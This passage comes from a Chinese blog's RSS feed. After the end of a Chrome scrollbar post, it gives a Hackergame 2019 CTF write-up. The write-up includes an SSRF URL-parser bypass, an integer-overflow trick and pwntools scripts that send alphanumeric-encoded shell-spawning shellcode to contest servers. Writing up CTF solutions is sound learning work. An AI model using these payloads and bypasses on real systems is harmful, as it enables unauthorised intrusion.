-<p><s>该方法目前在最新的 Chrome Canary 80 下同样有效，但 Overlay Scrollbars 相关代码在未来是否会被删除，或是是否会继续开发，就不得而知了。</s></p>
-
-
-
-<p>该方法在 Chrome Beta 79 &amp; Chrome Canary 80 下均已失效，<a rel="noreferrer noopener" aria-label="查看讨论 (opens in a new tab)" href="https://www.reddit.com/r/chrome/comments/dq48n6/where_the_fuck_did_overlayscrollbars_go/" target="_blank">查看讨论</a>。 查看 Commit 历史后，发现该 flag 是在 <a rel="noreferrer noopener" aria-label="commit&nbsp;6311d9a (opens in a new tab)" href="https://github.com/chromium/chromium/commit/6311d9ad6cd4d879fc160b46d17c40de76e6492b" target="_blank">commit&nbsp;6311d9a</a> 中被禁用的。</p>
-
-
-
-<p>值得一提的是，Overlay Scrollbars 在 Chrome OS 下是默认启用的，因此 Chromium 的代码库中仍存在重叠式滚动条的相关代码。虽然目前仍有较复杂的方法再次启用该功能，但我强烈建议对该功能有需求的用户，在 <a rel="noreferrer noopener" aria-label="reddit (opens in a new tab)" href="https://www.reddit.com/r/chrome/comments/dq48n6/where_the_fuck_did_overlayscrollbars_go/" target="_blank">reddit</a> 以及 <a rel="noreferrer noopener" aria-label="crbug (opens in a new tab)" href="https://bugs.chromium.org/p/chromium/issues/list" target="_blank">crbug</a> 反馈该问题，要求 Google 加回并继续维护 Windows 平台下的该功能。</p>
-
-
-
-<h2>一些吐槽</h2>
-
-
-
-<p>Chrome 市占率垄断之后越来越不考虑老用户的感受，很多用户仍有需求的功能想砍就砍，例如网页编码选择、<code>blocking webRequest</code> API（用于广告屏蔽）。</p>
-
-
-
-<p>换浏览器？然而 Firefox 在 Windows 下的体验也很糟糕，Firefox 的高精度触摸板、触摸屏支持比起 Edge 与 Chrome 要差很多。此外，微软现在也加入了 Chromium 的开发，未来 Firefox 与 Chrome 在 Windows 下的体验差距很可能只会越来越大。</p>
-
-
-
-<p><strong>Coxxs</strong></p>
-
-
-
-<blockquote class="wp-block-quote"><p>本文由 Coxxs 原创，转载须注明原文链接：<a href="https://dev.moe/1413">https://dev.moe/1413</a></p></blockquote>
-<p><a rel="nofollow" href="https://dev.moe/1413">在 Chrome 78 启用 overlay-scrollbars</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://dev.moe/1413/feed</wfw:commentRss>
-			<slash:comments>10</slash:comments>
-		
-		
-		<post-id xmlns="com-wordpress:feed-additions:1">1413</post-id>	</item>
-		<item>
-		<title>Hackergame 2019（中科大信安赛）write up</title>
-		<link>https://dev.moe/1321</link>
-					<comments>https://dev.moe/1321#comments</comments>
-		
-		<dc:creator><![CDATA[Coxxs]]></dc:creator>
-		<pubDate>Tue, 22 Oct 2019 04:00:26 +0000</pubDate>
-				<category><![CDATA[Code]]></category>
-		<guid isPermaLink="false">https://coxxs.me/?p=1321</guid>
-
-					<description><![CDATA[<p>过去一年并没有怎么打 CTF，不少比赛难度对我而言偏高，自己也没有特别拿手的题型。不过去年参加的 Hacker<a class="more-link" href="https://dev.moe/1321">继续阅读<span class="screen-reader-text">"Hackergame 2019（中科大信安赛）write up"</span></a></p>
-<p><a rel="nofollow" href="https://dev.moe/1321">Hackergame 2019（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></description>
-										<content:encoded><![CDATA[
-<p>过去一年并没有怎么打 CTF，不少比赛难度对我而言偏高，自己也没有特别拿手的题型。不过去年参加的 <a href="https://dev.moe/879">Hackergame 2018</a> 倒是玩得很开心，题目设计较有趣，难易度分布也较均匀。同时，由于赛程安排较长，在比赛的过程中能够有时间学习、消化新知识。</p>
-
-
-
-<p>今年的 Hackergame 算法题与数学题稍多，有些题目最后还是网上找到别人写好的算法来求解，更像是搜索能力竞赛（<s>其实是我太菜了</s>）。既然比赛难度循序渐进，本 write up 也会包含进几道简单却有趣的题目，难度由简单到中等循序渐进。至于为什么不整理较难的题&#8230;（<s>原因刚才说过了</s>）</p>
-
-
-
-<span id="more-1321"></span>
-
-
-
-<p>同去年一样，官方也发布了 write up：<a href="https://github.com/ustclug/hackergame2019-writeups" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">GitHub</a></p>
-
-
-
-<hr class="wp-block-separator"/>
-
-
-
-<h2>白与夜 100</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>这是一个关于白猫，嗯不对，关于黑猫的故事。 </p><cite><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://archive.is/fmnlW" target="_blank">题目</a></cite></blockquote>
-
-
-
-<p>题目里是一张白猫的图片，又不断暗示这只猫其实是<strong>黑猫</strong>。将图片下载后，发现图片是一张<strong>半透明</strong>的 png 图片。</p>
-
-
-
-<p>将猫咪放到黑色背景下，原来猫身的“白”色部分其实大部分是透明的，只是放在了白色的网页上才显现出白色。而在黑色背景下，猫身就显现出黑色了。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="505" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-1024x505.png" alt="" class="wp-image-1326" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-1024x505.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-300x148.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-768x378.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1.png 1301w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p><strong>flag{4_B14CK_C4T}</strong></p>
-
-
-
-<p><strong>题目并不难，不过我也想做出一张这样的图片。</strong>从图中可以看到，黑猫白猫的位置并不相同，并非同一只猫，而更像是两张图片合成起来的。</p>
-
-
-
-<p>我们先试着做一张这样的白猫图。将不透明的白猫图取出，并使用 GIMP 将其中的白色转换为透明色。这样一来，图片中就只剩下了透明度不同的纯黑色（以及一些完全透明的部分）。在白色背景下，修改后的白猫图与原图比看不出什么区别，但在黑色背景下，这张图无法看出任何内容。</p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat.png" alt="" class="wp-image-1334" width="255" height="252" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat.png 650w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat-300x296.png 300w" sizes="(max-width: 255px) 100vw, 255px" /><figcaption>试试在黑色背景下看这张图？</figcaption></figure></div>
-
-
-
-<p>这张图实际上是由完全透明的部分，以及透明度各不相同的纯黑色(#000000)像素构成。举个例子，一个不透明的灰色(#CCCCCC)像素，与不透明度为 20% 的纯黑色(#000000)像素在白色背景下是看不出区别的。</p>
-
-
-
-<p>以此类推，如果继续更改白猫图各个像素的颜色以及透明度，就能够在不改变白色背景下所看到的白猫的情况下，在黑色背景下展现出另一张图片。事实上，这也是一些聊天工具里流传的“点开就会变”的图片的原理。</p>
-
-
-
-<p>按照上述原理，写了一个 node.js 工具，用于生成这样的图片。项目地址： <a href="https://github.com/Coxxs/image-hide">https://github.com/Coxxs/image-hide</a></p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/ys8.png" alt="" class="wp-image-1333" width="262" height="262" srcset="https://dev.moe/wp-content/uploads/2019/10/ys8.png 400w, https://dev.moe/wp-content/uploads/2019/10/ys8-150x150.png 150w, https://dev.moe/wp-content/uploads/2019/10/ys8-300x300.png 300w" sizes="(max-width: 262px) 100vw, 262px" /><figcaption>丹娜超可爱！（不过丹娜在哪呢）</figcaption></figure></div>
-
-
-
-<h2>信息安全 2077 150</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>2077 年很快到来了。此时正值祖国 128 周年华诞，中国科学技术大学也因其王牌专业信息安全，走出国门，成为了世界一流大学。作为向信息安全专业输送人才的重要渠道，第 64 届信息安全大赛也正在如火如荼地开展着。<br>千里之行，始于足下。作为一名渴望进入信息安全专业的学生，你的第一个任务是拿到第 64 届信息安全大赛的签到题的 flag。我们已经为你找到了签到题的入口[1]，你只需要把&nbsp;<code>flag.txt</code>&nbsp;的内容读出来就可以了。<br>注：为了照顾到<a rel="noreferrer noopener" href="https://www.zhihu.com/question/298070646" target="_blank">使用黑曜石浏览器的用户</a>，第 64 届信息安全大赛的签到题决定沿袭之前 63 届信息安全大赛的惯例，仍然基于 HTTP 1.x。当然了，使用其他浏览器也是可以顺利完成任务的。 </p><cite>[1] <a href="https://gist.github.com/Coxxs/590e47cd4ee28aa14c671b4c6e3984ec" target="_blank" rel="noreferrer noopener" aria-label="网页源码 (opens in a new tab)">网页源码</a></cite></blockquote>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="492" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-1024x492.png" alt="" class="wp-image-1335" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-1024x492.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-300x144.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-768x369.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077.png 1060w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>打开网页，页面展示出一个倒计时，似乎要等到 2077 年才能查看 flag。在源码中可以看到页面在向 flag.txt 文件发起一个请求，并指定了 <code>User-Agent</code> 以及 <code>If-Unmodified-Since</code> 的 HTTP 头。</p>
-
-
-
-<p>由于浏览器安全策略原因，浏览器并未采用所指定的 <code>User-Agent</code>。抓包并将 <code>User-Agent</code> 改为黑曜石浏览器，再将 <code>If-Unmodified-Since</code> 头改为 2077 年，即可获得 flag。</p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-1024x699.png" alt="" class="wp-image-1337" width="433" height="295" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-1024x699.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-300x205.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-768x524.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077.png 1173w" sizes="(max-width: 433px) 100vw, 433px" /></figure></div>
-
-
-
-<p><strong>flag{Welc0me_to_competit1on_in_2077}</strong></p>
-
-
-
-<h2>网页读取器 150</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>今年，刚刚学会网络编程的小 T 花了一点时间，写了一个非常简单的网站：输入一个 URL，返回对应的内容。<br>不过小 T 想对用户访问的站点进行一些限制，所以他决定自己来解析 URL，阻止不满足要求的请求。这样也顺便解决了 SSRF（Server-Side Request Forgery, 服务器端请求伪造）的问题。<br>想象很美好，但小 T 真的彻底解决了问题吗？ </p><cite><a href="https://archive.is/7zybw" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">题目</a> <a rel="noreferrer noopener" aria-label="源码 (opens in a new tab)" href="https://gist.github.com/Coxxs/58af56086892774a891ef515ab632e2d" target="_blank">源码</a></cite></blockquote>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="804" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-1024x804.png" alt="" class="wp-image-1340" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-1024x804.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-300x235.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-768x603.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1.png 1431w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-
-
-
-<p>根据题面，问题应该是出在小 T 写的 URL 解析代码中。查看代码，发现在第二步剥离 URL 中的用户名时就出了问题，他将 <code>@</code> 符号前的所有文本都视为了用户名部分。</p>
-
-
-
-<p>输入 <code>http://web1/flag?@example.com</code>，绕过判断，获取 flag。</p>
-
-
-
-<p>这道题很好的演示了自己写解析函数可能带来的问题。实际项目中，自己编写 URL 解析虽不一定会有这样一眼能看出的安全问题，但却可能隐藏着更加难以发现的安全问题。<strong>因此这类解析最好还是不要自己造轮子，使用语言自身提供的解析函数，或使用比较流行的解析库会更靠谱。</strong></p>
-
-
-
-<p><strong>flag{UrL_1S_n0t_SO_easy}</strong></p>
-
-
-
-<h2>达拉崩吧大冒险 150</h2>
-
-
-
-<blockquote class="wp-block-quote"><p> 某一天，C 同学做了一个神奇的梦。在梦中，他来到了蒙达鲁克硫斯伯古比奇巴勒城…… </p></blockquote>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-934x1024.png" alt="" class="wp-image-1341" width="534" height="585" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-934x1024.png 934w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-274x300.png 274w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-768x842.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1.png 1583w" sizes="(max-width: 534px) 100vw, 534px" /><figcaption>题目截图</figcaption></figure></div>
-
-
-
-<p>非常欢乐的一道题，是一个勇者斗恶龙的故事！可以一边听<a rel="noreferrer noopener" href="https://www.bilibili.com/video/av9372087/" target="_blank">达拉崩吧</a>一边做题！ </p>
-
-
-
-<p>在王大妈这里，买入鲜美香脆可口甘甜现炸童子鸡可提升攻击力。通过修改网页代码，发现支持买入负数只鸡。此时攻击力会<strong>降低</strong>，而金钱会<strong>增加</strong>。但我们需要的是增加攻击力去打恶龙昆图库塔卡提考特苏瓦西拉松，钱再多也没用啊！</p>
-
-
-
-<p>多次尝试后可得出，先买入 -MaxInt64 只（-9223372036854775808）童子鸡，此时攻击力会变成非常小的一个负数。再买入 -1 只童子鸡，攻击力会溢出，变为非常大的一个正数。（实际有很多种买法，让攻击力变得太小溢出即可）</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="516" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-1024x516.png" alt="" class="wp-image-1342" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-1024x516.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-300x151.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-768x387.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2.png 1231w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>与隔壁王大妈的交<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />易现场</figcaption></figure>
-
-
-
-<p>获得 9223372036854776000 的攻击力后，去干恶龙即可。</p>
-
-
-
-<figure class="wp-block-image"><img loading="lazy" width="1024" height="1024" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-1024x1024.png" alt="" class="wp-image-1343" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-1024x1024.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-150x150.png 150w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-300x300.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-768x768.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption> 恶龙昆图库塔卡提考特苏瓦西拉松被<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />干现场</figcaption></figure>
-
-
-
-<p><strong>flag{what_an_amazing_dream}</strong></p>
-
-
-
-<h2>Happy LUG 150</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>在今年信安大赛命题组的内部聊天记录中，出现次数最多的 emoji 是什么？<br>答案是：「<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f602.png" alt="😂" class="wp-smiley" style="height: 1em; max-height: 1em;" />」（喜极而泣的表情，Face with Tears of Joy）。这是大家最喜欢使用的 emoji 之一。<br>或许是因为这个原因，最近几天，命题组某位同学收到了一张神秘的字条。<br>看起来是一个域名，但里面怎么会有 <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f602.png" alt="😂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 这个 emoji？而且，虽然浏览器访问不了，<strong>但这个域名确实是存在着的。</strong><br>你能解开其中隐藏着的信息吗？ </p></blockquote>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-1024x768.png" alt="" class="wp-image-1347" width="389" height="291" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-1024x768.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-300x225.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-768x576.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1.png 2048w" sizes="(max-width: 389px) 100vw, 389px" /><figcaption>题目图片</figcaption></figure></div>
-
-
-
-<p>题目其实暗示很明显了，域名存在却打不开，我们则自然要去找为什么“打不开”。<a href="https://en.wikipedia.org/wiki/Emoji_domain">Emoji 域名</a>并不是什么新鲜事了，与中文域名原理相同，是将包含特殊字符的字串转换为 <a rel="noreferrer noopener" aria-label="Punycode (opens in a new tab)" href="https://en.wikipedia.org/wiki/Punycode" target="_blank">Punycode</a>。而我们的浏览器就是我们手边的转换工具。</p>
-
-
-
-<p>将 <code>&#x1f602;.hack.ustclug.org</code> 这个域名复制到地址栏，回车后复制回来，可以获得实际域名 <code>xn--g28h.hack.ustclug.org</code>，前面的 <code>xn--g28h</code> 就是 Punycode 了。</p>
-
-
-
-<p>接着我们要解决这个网址“打不开”的问题。要访问一个域名代表的网站，浏览器首先会对域名做 DNS 解析。我们用 dig 命令来看看解析结果吧（也可使用其他的 <a href="https://dns.google.com" target="_blank" rel="noreferrer noopener" aria-label="DNS 解析工具 (opens in a new tab)">DNS 解析工具</a>）。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ dig xn--g28h.hack.ustclug.org
-dig: 'xn--g28h.hack.ustclug.org.' is not a legal IDNA2008 name (string contains a disallowed character), use +noidnout
-
-$ dig xn--g28h.hack.ustclug.org +noidnout
-
-; &lt;&lt;>> DiG 9.11.5-P1-1ubuntu2.5-Ubuntu &lt;&lt;>> xn--g28h.hack.ustclug.org +noidnout
-;; global options: +cmd
-;; Got answer:
-# ... (此处省略)
-;xn--g28h.hack.ustclug.org.     IN      A</pre>
-
-
-
-<p>可以看出这个域名查询请求并没有回应 A 记录（使用 <code>dig AAAA xn--g28h.hack.ustclug.org</code> 测试，也没有 AAAA 记录），浏览器找不到对应的 IP，自然无法访问。那试试看其他常见的记录类型呢？</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">root@localhost:~# dig TXT xn--g28h.hack.ustclug.org +noidnout
-
-; &lt;&lt;>> DiG 9.11.5-P1-1ubuntu2.5-Ubuntu &lt;&lt;>> TXT xn--g28h.hack.ustclug.org +noidnout
-;; global options: +cmd
-;; Got answer:
-# ... (此处省略)
-;; QUESTION SECTION:
-;xn--g28h.hack.ustclug.org.     IN      TXT
-
-;; ANSWER SECTION:
-xn--g28h.hack.ustclug.org. 60   IN      TXT     "flag{DN5_C4N_H4VE_em0ji_haha}"</pre>
-
-
-
-<p>当使用常用作字串的 TXT 记录类型时，返回了 flag。</p>
-
-
-
-<p><strong>flag{DN5_C4N_H4VE_em0ji_haha}</strong></p>
-
-
-
-<h2>Shell 骇客 400</h2>
-
-
-
-<blockquote class="wp-block-quote"><p> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！ </p><cite>nc 202.38.93.241 10000<br>nc 202.38.93.241 10002<br>nc 202.38.93.241 10004</cite></blockquote>
-
-
-
-<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/ShellHacker.zip">ShellHacker.zip</a><a href="https://coxxs.me/wp-content/uploads/2019/10/ShellHacker.zip" class="wp-block-file__button" download>下载</a></div>
-
-
-
-<p>似乎是一道萌新向的 pwn 题，题目中也给出了源代码。正好我也不会 pwn，那就借着这题初步了解下。</p>
-
-
-
-<p>三道小题都直接调用了用户输入的内容，后两个小问则额外对用户输入的内容做了限制：第二问为 32 位程序，限制只能输入 <code>[0-9A-Z]{,200}</code>，第三问为 64 位程序，限制只能输入 <code>0x32 ~ 0x7e</code> 范围内的字符。</p>
-
-
-
-<p>简单学习了一下 pwntools 的使用，第一小题 Python 代码如下：</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
-context(arch = 'amd64', os = 'linux')
-
-r = remote('202.38.93.241', 10000)
-print r.recvuntil(':', drop=True)
-r.send('[选手token]\r\n')
-shellcode = asm(shellcraft.sh())
-r.send(shellcode)
-r.interactive()</pre>
-
-
-
-<p>进入 Shell 后 <code>ls</code> 列目录，<code>cat flag</code> 获得 flag 文件的内容。</p>
-
-
-
-<p>后两小题对输入字符做了限制，尝试用 <code>pwnlib.encoders</code> 生成符合条件的 shellcode，但并未能成功。后来参考一位<a rel="noreferrer noopener" aria-label="大神的文章 (opens in a new tab)" href="https://www.jianshu.com/p/8ae8c055e35c" target="_blank">大神的文章</a>，使用 <a rel="noreferrer noopener" aria-label="alpha3.py (opens in a new tab)" href="https://github.com/SkyLined/alpha3" target="_blank">alpha3.py</a> 对 pwnlib 生成出的 shellcode 进行转换，最终成功执行 shellcode。</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
-context(arch = 'i386', os = 'linux')
-
-r = remote('202.38.93.241', 10002)
-print r.recvuntil(':', drop=True)
-r.send('[选手token]\r\n')
-r.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06')
-r.interactive()</pre>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
-context(arch = 'amd64', os = 'linux')
-
-r = remote('202.38.93.241', 10004)
-print r.recvuntil(':', drop=True)
-r.send('[选手token]\r\n')
-r.send('Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t')
-r.interactive()</pre>
-
-
-
-<h2>小 U 的加密 200</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>小 U 是一位可爱的萌新，前不久开始学习编程。最近，他刚学了位运算，就写了个小程序来「加密」自己的文件。我们拿到了一份经过他加密之后的文件（据称这是一个音频文件），你能否还原原始文件的内容，找到 flag？<br>注：flag 中的字符串全部为英文小写字符。 </p></blockquote>
-
-
-
-<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.zip">flag.enc</a><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.zip" class="wp-block-file__button" download>下载</a></div>
-
-
-
-<p>根据题目，刚学了位运算的小 U 当然会选择用异或运算来加密文件啦！由于完全没有密钥，很可能是用了同一个字节异或了整个文件。</p>
-
-
-
-<p>一开始尝试了使用 <code>0x00 - 0xFF</code> 分别对文件头进行异或，看看能不能找到熟悉的文件头，但却啥都找不着。</p>
-
-
-
-<p>稍作思考后，看到这个文件中有特别多的 <code>0x39</code> 字节。对于大多数二进制文件来说，文件里有许多 <code>0x00</code> 是再正常不过的事了，而 <code>0x00 xor 0x39 = 0x39</code>，因此整个文件很可能是被 <code>0x39</code> 异或了。</p>
-
-
-
-<p>将文件还原后，文件头是 <code>MThd</code>，搜索后才知道，原来这是 MIDI 文件。将“解密”后的文件重命名为 <code>flag.mid</code>。</p>
-
-
-
-<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.mid">flag.mid</a><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.mid" class="wp-block-file__button" download>下载</a></div>
-
-
-
-<p>直接播放只能听到一串杂乱的音符，用 MIDI 编辑器打开看看，原来是用音符拼成了 flag。（让我想起我以前出的一道题 = =##）</p>
-
-
-
-<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-1024x507.png" alt="" class="wp-image-1354" width="316" height="156" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-1024x507.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-300x149.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-768x380.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1.png 1928w" sizes="(max-width: 316px) 100vw, 316px" /></figure></div>
-
-
-
-<p><strong>flag{justxorandmidi}</strong></p>
-
-
-
-<h2>天书残篇 250</h2>
-
-
-
-<blockquote class="wp-block-quote"><p>古尔丹的魔法书<br>很久很久以前，兽族部落还未建立起来。古尔丹的早期经历鲜有人知，他原本是影月氏族的一员，在学习利用萨满的元素之力时展现了非凡的天赋。因此被光荣地选为萨满长老耐奥祖的学徒。长老十分喜爱自己的这位学生，于是长老将千年流传下来的天书交给了他，长老对着年轻的古尔丹说：“这是一本天书，里面记录了非凡的魔法，如果你能参悟其中的奥秘，你将能带领族人成就一番伟大事业。”年轻的古尔丹从小渴望力量，他接过了长老的书，认真的看了起来。<br>经过一段时间，古尔丹掌握了天书的奥秘，他利益熏心，对于力量的渴望吞噬了他的理智。之后便有了燃烧军团&#8230;&#8230;..<br>古尔丹死后，他的头骨变成了某种与恶魔之力沟通的信物。古尔丹的一小片灵魂仍然寄存在他的头骨之中，持有之人能够听到他的私语——即使在死后，这位术士仍然十分危险。耐奥祖曾经用这头骨打开了德拉诺通往其他世界的传送门，后来卡德加又用它摧毁了黑暗之门。黑暗之门被毁后，卡德加为了逃离此处而在匆忙之间将头骨丢在了德拉诺某处耐奥祖创造的扭曲虚空之中。多年之后它又在艾泽拉斯重新出现，这一次它被燃烧军团用于污染费伍德的森林。从死亡骑士阿尔萨斯处了解到它的存在后，伊利丹·怒风找到并带走了头骨，在吸收其力量之后变成了半暗夜精灵半恶魔的状态。古尔丹的记忆依靠头骨内的术士魔法和陵墓墙上的符文继续存在着，伊利丹通过头骨内古尔丹的记忆找到了陵墓，而玛维·影歌则找到了符文。在陵墓坍塌之后，古尔丹存在过的最后证明也消失无踪。<br>我们找到了那本启示古尔丹的魔法书的残卷，它因为年代久远仅剩下零落几页，但是书籍里尘封着伟大力量却在召唤着你。年轻人参悟这伟大的力量吧！ </p></blockquote>
-
-
-
-<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/天书残篇.zip">天书残篇</a><a href="https://coxxs.me/wp-content/uploads/2019/10/天书残篇.zip" class="wp-block-file__button" download>下载</a></div>
-
-
-
-<p>题目很长，啥提示都看不出来。文件中只有三种字符，空格、Tab、换行。一开始试了各种方法，一直都没能解开&#8230; 直到在一个并没有聊比赛的群里，看到一位群友发的一张 <a rel="noreferrer noopener" aria-label="Whitespace 编程语言 (opens in a new tab)" href="https://en.wikipedia.org/wiki/Whitespace_(programming_language)" target="_blank">Whitespace 编程语言</a>的百科截图&#8230;</p>
-
-
-
-<p>在网上找到 <a rel="noreferrer noopener" aria-label="Whitespace 的在线 IDE (opens in a new tab)" href="https://vii5ard.github.io/whitespace/" target="_blank">Whitespace 的在线 IDE</a>，运行这段代码，但这段代码不仅没有向被坑了半天的我打印出答案，竟然还开始反问我要 flag。去年被这比赛的 Malbolge&nbsp;语言玩得半死，今年得吸取教训了——flag 有可能是和去年一样，直接编码在了代码中。</p>
-
-
-
